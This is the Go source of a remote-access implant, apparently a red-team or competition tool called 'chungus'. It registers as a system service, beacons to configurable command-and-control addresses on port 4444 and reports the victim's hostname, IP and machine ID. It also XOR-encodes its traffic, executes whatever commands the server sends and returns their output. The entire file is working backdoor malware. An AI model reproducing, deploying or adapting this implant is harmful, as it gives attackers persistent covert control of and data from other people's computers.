package main

import (
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/BradHacker/chungus/pb"
	"github.com/kardianos/service"
	"github.com/shirou/gopsutil/host"

	"github.com/denisbrodbeck/machineid"
	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/types/known/timestamppb"
)

var REMOTE_IP = "127.0.0.1,127.0.1.1"
var PORTS = "4444"
var XOR_KEY = "abcd1234"
var SRV_NAME = "Br4vo6ix"
var SRV_DSP_NAME = "Br4vo6ix"
var SRV_DESC = "Implant"
var BOX_IP = ""

// getIP gets the victim's IP
func getIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

var logger service.Logger

type program struct{}

func (p *program) Start(s service.Service) error {
	BOX_IP = getIP()
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}

func (p *program) run() {
	r, _ := base64.StdEncoding.DecodeString(REMOTE_IP)
	c2Ips := strings.Split(string(r), ",")
	stringyPorts := strings.Split(PORTS, ",")
	ports := make([]int, len(stringyPorts))
	for i, p := range stringyPorts {
		ports[i], _ = strconv.Atoi(p)
	}
	for {
		// Shuffle the IPs each time to it tries them in different orders
		rand.Seed(time.Now().UnixNano())
		rand.Shuffle(len(c2Ips), func(i, j int) { c2Ips[i], c2Ips[j] = c2Ips[j], c2Ips[i] })
		for _, c2 := range c2Ips {
			rand.Seed(time.Now().UnixNano())
			port := ports[rand.Intn(len(ports))]
			didConnect := CheckForTasks(c2, port)
			// If we communicated with the server successfully, just go back to sleep
			if didConnect {
				break
			}
			// otherwise wait 10 secs and then try the next ip address
			time.Sleep(10 * time.Second)
		}
		time.Sleep(300 * time.Second)
	}
}

func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	return nil
}

func EncodeDecodeData(data []byte, key []byte) []byte {
	output := make([]byte, len(data))
	for i, inputByte := range data {
		output[i] = inputByte ^ key[i%len(key)]
	}
	return output
}

func GenerateHeartbeat() pb.Heartbeat {
	implant_id, _ := machineid.ProtectedID("bigchungusinspacejam")
	host, err := host.Info()
	var hostname string
	if err != nil {
		hostname = "unknown"
	} else {
		hostname = host.Hostname
	}
	return pb.Heartbeat{
		Hostname:  hostname,
		Ip:        BOX_IP,
		MachineId: implant_id,
		Pid:       int64(os.Getpid()),
		SentAt:    &timestamppb.Timestamp{},
	}
}

func SendHeartbeat(c *net.Conn) error {
	hb := GenerateHeartbeat()
	hbBytes, err := proto.Marshal(&hb)
	if err != nil {
		return fmt.Errorf("couldn't marshalling heartbeat: %v", err)
	}
	encHbBytes := EncodeDecodeData(hbBytes, []byte(XOR_KEY))
	numSentBytes, err := (*c).Write(encHbBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending heartbeat: %v", err)
	}
	if numSentBytes != len(hbBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(hbBytes))
	}
	return nil
}

func SendTaskResponse(c *net.Conn, t *pb.Task, output string, e string) error {
	tRes := pb.TaskResponse{
		Uuid:   t.Uuid,
		Stdout: output,
		Stderr: e,
	}
	tResBytes, err := proto.Marshal(&tRes)
	if err != nil {
		return fmt.Errorf("couldn't marshalling task response: %v", err)
	}
	encResBytes := EncodeDecodeData(tResBytes, []byte(XOR_KEY))
	numSentBytes, err := (*c).Write(encResBytes)
	if err != nil {
		return fmt.Errorf("couldn't sending task response: %v", err)
	}
	if numSentBytes != len(tResBytes) {
		return fmt.Errorf("didn't send all bytes (sent %d of %d)", numSentBytes, len(tResBytes))
	}
	return nil
}

func SpawnConnection(ip string, port int) (*net.Conn, error) {
	con, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return nil, fmt.Errorf("error dialling remote host")
	}
	return &con, nil
}

func ExecuteTaskCMD(t *pb.Task) (string, string) {
	cmdParts := strings.Split(t.Payload, " ")
	cmd := cmdParts[0]
	args := cmdParts[1:]
	command := exec.Command(cmd, args...)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	command.Stdout = &stdout
	command.Stderr = &stderr
	err := command.Run()
	if err != nil {
		return "", fmt.Sprintf("error executing task: %v", err)
	}
	return stdout.String(), stderr.String()
}

func ExecuteTaskSCRIPT(t *pb.Task) (string, string) {
	return "", fmt.Sprintf("not implemented yet: %v", t)
}

func CheckForTasks(r string, p int) (spawnedConnection bool) {
	spawnedConnection = false
	c, err := SpawnConnection(r, p)
	if err != nil {
		// fmt.Printf("error while spawning connection: %v", err)
		return
	}
	defer (*c).Close()

	err = SendHeartbeat(c)
	if err != nil {
		// fmt.Printf("error while sending heartbeat: %v", err)
		return
	}

	taskBytes := make([]byte, 4069)
	taskNumBytes, err := (*c).Read(taskBytes)
	if err != nil {
		if taskNumBytes == 0 {
			// fmt.Println("NOOP")
			return
		}
		// fmt.Printf("error reading task: %v", err)
		return
	}
	decTaskBytes := EncodeDecodeData(taskBytes[:taskNumBytes], []byte(XOR_KEY))
	t := pb.Task{}
	err = proto.Unmarshal(decTaskBytes, &t)
	if err != nil {
		// fmt.Printf("error unmarshalling task: %v", err)
		return
	}

	var stdout string
	var stderr string
	switch t.Type {
	case pb.Task_NOOP:
		// fmt.Println("NOOP")
		return // Server expects no response
	case pb.Task_CMD:
		stdout, stderr = ExecuteTaskCMD(&t)
	case pb.Task_SCRIPT:
		stdout, stderr = ExecuteTaskSCRIPT(&t)
	}
	// fmt.Printf("%s\n---\n%s\n", stdout, stderr)

	err = SendTaskResponse(c, &t, stdout, stderr)
	if err != nil {
		// fmt.Printf("error sending task response")
		return
	}
	spawnedConnection = true
	return
}

func main() {
	svcFlag := flag.String("service", "", "Control the system service.")
	flag.Parse()

	svcConfig := &service.Config{
		Name:        SRV_NAME,
		DisplayName: SRV_DSP_NAME,
		Description: SRV_DESC,
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}

	if len(*svcFlag) != 0 {
		err := service.Control(s, *svcFlag)
		if err != nil {
			logger.Infof("Valid actions: %q\n", service.ControlAction)
			logger.Error(err)
		}
		return
	}

	err = s.Run()
	if err != nil {
		logger.Error(err)
	}
}
